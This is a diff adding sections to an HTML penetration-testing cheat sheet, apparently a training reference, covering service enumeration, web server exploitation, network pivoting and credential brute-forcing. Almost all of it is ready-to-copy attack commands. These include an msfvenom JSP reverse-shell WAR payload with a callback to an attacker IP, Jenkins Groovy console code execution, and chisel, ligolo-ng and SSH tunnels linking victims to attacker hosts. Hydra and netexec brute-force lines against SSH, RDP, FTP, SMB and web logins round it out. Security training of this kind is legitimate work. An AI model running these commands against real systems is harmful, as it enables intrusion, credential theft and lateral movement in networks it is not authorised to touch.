@@ -266,6 +266,143 @@
       </div>
     </div>
 
+    <!-- Service Exploits -->
+    <div class="cs-section" id="service-exploits">
+      <h2 class="cs-section-title"><span class="sec-icon">💥</span> Service Exploitation</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Common Service Attacks</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># FTP anonymous login</span>
+ftp &lt;IP&gt;   <span class="cm"># user: anonymous, pass: anonymous</span>
+wget -m --no-passive ftp://anonymous:@&lt;IP&gt;/
+
+<span class="cm"># SMTP user enumeration</span>
+smtp-user-enum -M RCPT -U users.txt -D domain.com -t &lt;IP&gt;
+
+<span class="cm"># DNS zone transfer</span>
+dig axfr domain.com @&lt;IP&gt;
+dnsrecon -d domain.com -t axfr
+
+<span class="cm"># SNMP enumeration</span>
+snmpwalk -v2c -c public &lt;IP&gt;
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;IP&gt;
+
+<span class="cm"># LDAP anonymous bind</span>
+ldapsearch -H ldap://&lt;IP&gt; -x -b "DC=domain,DC=com"
+windapsearch.py --dc-ip &lt;IP&gt; -U
+
+<span class="cm"># RDP</span>
+xfreerdp /v:&lt;IP&gt; /u:Administrator /p:Password /dynamic-resolution +clipboard</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Web App Servers</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Tomcat manager upload (MSF)</span>
+use exploit/multi/http/tomcat_mgr_upload
+<span class="cm"># Or: msfvenom WAR shell → upload via /manager/html</span>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f war -o shell.war
+
+<span class="cm"># Jenkins Groovy console RCE</span>
+<span class="cm"># Navigate to /script, paste:</span>
+def cmd = "id".execute(); println cmd.text
+
+<span class="cm"># WPScan (WordPress)</span>
+wpscan --url http://&lt;IP&gt; -e ap,u --api-token &lt;TOKEN&gt;
+
+<span class="cm"># Droopescan (Drupal/Joomla)</span>
+droopescan scan drupal -u http://&lt;IP&gt;</pre>
+      </div>
+    </div>
+
+    <!-- Advanced Pivoting -->
+    <div class="cs-section" id="pivoting">
+      <h2 class="cs-section-title"><span class="sec-icon">🔀</span> Advanced Pivoting</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Ligolo-ng (Recommended 2026)</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Attacker: start proxy</span>
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+<span class="cm"># Victim: run agent</span>
+./agent -connect &lt;attacker_IP&gt;:11601 -ignore-cert
+
+<span class="cm"># Attacker console: add tunnel interface</span>
+<span class="cm"># ligolo-ng: session → use 0 → ifconfig → note subnet</span>
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.10.10.0/24 dev ligolo
+
+<span class="cm"># Start tunnel</span>
+<span class="cm"># ligolo-ng: start</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Chisel Tunneling</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Attacker server</span>
+chisel server --reverse --port 9001
+
+<span class="cm"># Victim client — SOCKS5 reverse proxy</span>
+chisel client &lt;attacker_IP&gt;:9001 R:socks
+
+<span class="cm"># Local port forward (victim → internal service)</span>
+chisel client &lt;attacker_IP&gt;:9001 R:8888:&lt;internal_IP&gt;:80
+
+<span class="cm"># Use with proxychains</span>
+echo "socks5 127.0.0.1 1080" &gt;&gt; /etc/proxychains.conf
+proxychains nmap -sT -Pn &lt;internal_IP&gt;</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">SSH Tunneling</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Dynamic SOCKS proxy</span>
+ssh -D 9050 -N user@&lt;pivot_IP&gt;
+
+<span class="cm"># Local forward (access internal RDP via pivot)</span>
+ssh -L 13389:&lt;internal_IP&gt;:3389 user@&lt;pivot_IP&gt;
+
+<span class="cm"># Remote forward (expose attacker port through victim)</span>
+ssh -R 9001:127.0.0.1:9001 user@&lt;pivot_IP&gt;
+
+<span class="cm"># Double pivot</span>
+ssh -J user@&lt;hop1&gt; user@&lt;hop2&gt; -D 9050</pre>
+      </div>
+    </div>
+
+    <!-- Credential Attacks -->
+    <div class="cs-section" id="cred-attacks">
+      <h2 class="cs-section-title"><span class="sec-icon">🔑</span> Credential Attacks</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Hydra / Medusa Brute Force</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># SSH brute force</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://&lt;IP&gt;
+
+<span class="cm"># HTTP POST form</span>
+hydra -l admin -P passwords.txt &lt;IP&gt; http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+
+<span class="cm"># FTP</span>
+hydra -L users.txt -P passwords.txt ftp://&lt;IP&gt;
+
+<span class="cm"># RDP</span>
+hydra -L users.txt -P passwords.txt rdp://&lt;IP&gt;
+
+<span class="cm"># SMB (use netexec instead — less lockout risk)</span>
+nxc smb &lt;IP&gt; -u users.txt -p passwords.txt --continue-on-success --jitter 2</pre>
+      </div>
+    </div>
+
   </main>
 </div>
 
